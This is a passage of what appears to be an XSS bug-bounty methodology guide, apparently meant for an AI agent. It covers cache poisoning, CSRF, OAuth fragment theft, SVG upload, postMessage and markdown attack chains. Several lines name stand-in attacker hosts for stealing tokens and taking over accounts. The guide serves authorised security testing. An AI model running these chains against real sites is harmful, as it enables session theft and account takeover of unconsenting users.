counts that are exactly equal. One scope shipped this and reported
`script.src 3 · iframe.src 3` - the *same three* sites - and the inflated totals
reached the note. Give them one honest name (`element.src`) and add an assert so
the duplication cannot return:

```python
_pats = [p for _n, p in SINKS]
assert len(_pats) == len(set(_pats)), "two sinks share a pattern: ..."
```

## MEASURE THE SIGNUP SURFACE BEFORE OFFERING TO USE AN ACCOUNT

Before asking for or promising an authenticated hunt, probe whether an account is
obtainable at all. Across 11 in-scope hosts on one engagement: **9 had no signup
surface**, 1 was gated on partner status, and the single host with a password
field was an **existing-vendor login** - readable from the form alone
(`ctl00$MainContent$txtUsername` / `txtPassword` posting to `Login.aspx`, zero
occurrences of `register` / `sign up` / `create account` / `enroll` on the page).
A password field is not a signup form: check the fields AND the page's wording
before telling the user which site to register on.

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.